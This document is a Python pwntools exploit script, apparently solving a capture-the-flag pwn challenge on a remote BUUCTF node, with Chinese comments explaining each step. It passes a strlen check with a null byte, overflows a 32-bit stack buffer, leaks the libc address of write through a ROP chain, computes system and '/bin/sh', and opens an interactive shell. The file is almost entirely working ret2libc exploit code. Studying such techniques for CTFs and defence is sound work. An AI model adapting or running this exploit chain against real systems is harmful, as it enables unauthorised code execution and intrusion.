from pwn import *
from LibcSearcher import *

context.log_level = 'debug'


r = remote('node5.buuoj.cn', 29278)
elf = ELF('../pwn')

# 使buf第一位为\0，绕过strlen函数；buf[7]的assci值大于0xE7+4(235)造成栈溢出,即buf[7]=\xff(255)
payload = b'\x00' + b'a' * 6 + b'\xff'

r.sendline(payload)
r.recvuntil('Correct\n')

# 用write函数泄露libc的地址进行ROP
write_plt = elf.plt['write']  # 0x8048578
write_got = elf.got['write']  # 0x8049fec

# 用puts函数泄露libc的地址进行ROP
puts_plt = elf.plt['puts']  # 0x8048548
puts_got = elf.got['puts']  # 0x8049fd4

main_addr = 0x8048825

# print(hex(puts_plt))
# print(hex(puts_got))

# 32位程序传参方式为栈传参，而64位程序则是优先通过寄存器传参(届时就需要用ROPgadget寻找gadgets来进行ROP了)
# 调用函数的栈结构为：调用函数地址 -> 函数返回的地址 -> 参数n -> 参数n-1 -> ... -> 参数1
# 假设要泄露的是函数func的地址，我们需要构造write(1, func_got_addr, 4)或者puts(func_got_addr)
'''
这里使用write进行泄露地址，write有三个参数
第一个是文件句柄，0为标准输入，1为标准输出，2为标准错误
第二个是要写的内容
第三个是要写的字节数
'''
write_payload = b'a' * 0xe7 + p32(0) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
#                                        调用函数        返回函数   write参数1(标准输出)  要泄露的地址  泄露的字节数

r.sendline(write_payload)
# write_addr = u32(r.recvuntil(b'\xf7'))
write_addr = u32(r.recv(4))
print(hex(write_addr))  # 0xf7ec63c0

# 直接使用puts进行32位的ROP
puts_payload = b'a' * 0xe7 + p32(0) + p32(puts_plt) + p32(main_addr) + p32(puts_got)
# r.sendline(puts_payload)
# puts_addr = u32(r.recv(4))  # 0xf7e5b140
# print(hex(puts_addr))

'''
# 获取对应版本的libc
# 建议不要用LibcSearcher, 获得puts、write地址之后，到 https://libc.blukat.me/下载二进制文件进行离线分析算出system的地址、puts的地址
libc = LibcSearcher('write', write_addr)

# 获取base地址
libc_base = write_addr - libc.dump('write')
print(hex(libc_base))  # 0xf7d8e000
# libc = LibcSearcher('puts', puts_addr)
# libc_base = puts_addr - libc.dump('puts')

# 获取system和bash
system_addr = libc_base + libc.dump('system')
bash_addr = libc_base + libc.dump('str_bin_sh')

print(hex(system_addr))  # 0xf7d35300
print(hex(bash_addr))  # 0xf7eabe3c
'''

libc = ELF('../lib/libc-2.23.so')
system_offset = libc.sym['system']
write_offset = libc.sym['write']
# puts_offset = libc.sym['puts']
bash_offset = libc.search(b'/bin/sh').__next__()

print(hex(write_offset))
print(hex(system_offset))
print(hex(bash_offset))

base_addr = write_addr - write_offset
system_addr = base_addr + system_offset
bash_addr = base_addr + bash_offset

# 溢出 + 调用函数 + 返回函数 + 调用函数的参数
system_payload = b'a' * 0xe7 + p32(0) + p32(system_addr) + p32(main_addr) + p32(bash_addr)
# system_payload = b'a' * 0xe7 + p32(0) + p32(system_addr) + p32(0) + p32(bash_addr)  # exit(0)

r.sendline(payload)
r.recvuntil('Correct\n')

r.sendline(system_payload)
r.interactive()
